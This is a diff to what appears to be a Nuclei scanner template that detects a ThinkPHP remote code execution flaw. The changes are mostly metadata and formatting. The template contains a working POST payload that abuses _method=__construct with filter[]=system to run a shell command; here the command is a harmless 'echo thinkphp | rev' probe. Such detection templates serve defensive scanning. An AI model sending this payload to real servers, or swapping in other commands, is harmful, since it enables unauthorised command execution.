@@ -9,17 +9,19 @@ info:
     - https://www.exploit-db.com/exploits/46150
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10.0
+    cvss-score: 10
     cwe-id: CWE-77
-  tags: edb,thinkphp,rce
   metadata:
     max-request: 1
+  tags: edb,thinkphp,rce,vuln
 
 http:
   - method: POST
     path:
       - "{{BaseURL}}/?s=index/index/index"
+
     body: "s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system"
+
     headers:
       Content-Type: application/x-www-form-urlencoded
 
@@ -33,5 +35,4 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/05/31
+# digest: 4a0a0047304502205119f2e913fe12056da60000bfaca975a17effaf6ad8be6a29951496b2ef1b12022100f0aeb2f75ad1e527c791654b9f78c703f65f39a66d1cd345b751daf6d1f346cd:922c64590222798bb761d5b6d8e72950
